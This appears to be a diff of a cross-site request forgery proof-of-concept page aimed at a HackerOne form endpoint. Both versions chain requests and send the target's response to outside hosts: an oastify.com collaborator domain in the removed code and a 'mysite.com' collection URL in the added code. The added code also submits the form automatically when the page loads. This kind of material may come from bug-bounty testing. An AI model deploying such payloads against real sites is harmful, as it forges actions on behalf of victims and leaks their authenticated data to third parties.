@@ -1,58 +1,44 @@
 <html>
   <body>
-    <form id="myForm" method="POST" action="https://hackerone.com/stories-of-2024/new">
+    <form id="submissionForm" action="https://hackerone.com/stories-of-2024/new" method="POST">
       <input type="submit" value="Submit request" />
     </form>
 
     <script>
-      // Intercept the form submission to capture the response
-      document.getElementById("myForm").onsubmit = function(event) {
-        //event.preventDefault();  // Prevent the form from submitting the usual way
+      // Override the form submission to prevent the default behavior
+      document.getElementById('submissionForm').onsubmit = function(event) {
+        event.preventDefault();  // Prevent the form from submitting normally
 
-        // Create FormData object to capture the form data
-        const formData = new FormData(document.getElementById("myForm"));
-
-        // First fetch request
-        fetch("https://hackerone.com/stories-of-2024/new", {
-          method: "GET",
-          body: formData,
+        // Send the request using fetch
+        fetch('https://hackerone.com/stories-of-2024/new', {
+          method: 'POST',
+          body: new FormData(this)  // Send the form data
         })
-        .then((response) => {
-          if (!response.ok) {
-            throw new Error("Network response was not ok");
-          }
-          return response.json();  // Parse the first response as JSON
-        })
-        .then((data) => {
-          console.log("First fetch response:", data);
-
-          // Use the data from the first request to perform the second request
-          // (Assume the first response has some property `someValue` you want to send)
-          const secondRequestData = { valueFromFirstRequest: data.someValue };
-
-          // Second fetch request, nested inside the first one
-          return fetch("https://9kuk44e7q6u7q3iu4ctnxqos0j6au4it.oastify.com", {
-            method: "POST",
+        .then(response => response.text())  // Assuming the response is text
+        .then(data => {
+          // Now, send the received data to the new URL
+          fetch('https://mysite.com/confirmed/submissions', {
+            method: 'POST',
+            body: JSON.stringify({ response: data }),  // Assuming you want to send the response data as JSON
             headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify(secondRequestData),
+              'Content-Type': 'application/json'  // Set the proper header for JSON
+            }
+          })
+          .then(confirmResponse => {
+            // Handle confirmation response if needed
+            console.log('Response confirmed');
+          })
+          .catch(error => {
+            console.error('Error confirming submission:', error);
           });
         })
-        .then((secondResponse) => {
-          if (!secondResponse.ok) {
-            throw new Error("Second request failed");
-          }
-          return secondResponse.json();  // Parse the second response as JSON
-        })
-        .then((secondData) => {
-          console.log("Second fetch response:", secondData);
-          // Handle the second response data here
-        })
-        .catch((error) => {
-          console.error("Error in fetch chain:", error);
+        .catch(error => {
+          console.error('Error in submission request:', error);
         });
       };
+
+      // Trigger form submission programmatically
+      document.getElementById('submissionForm').submit();
     </script>
   </body>
 </html>
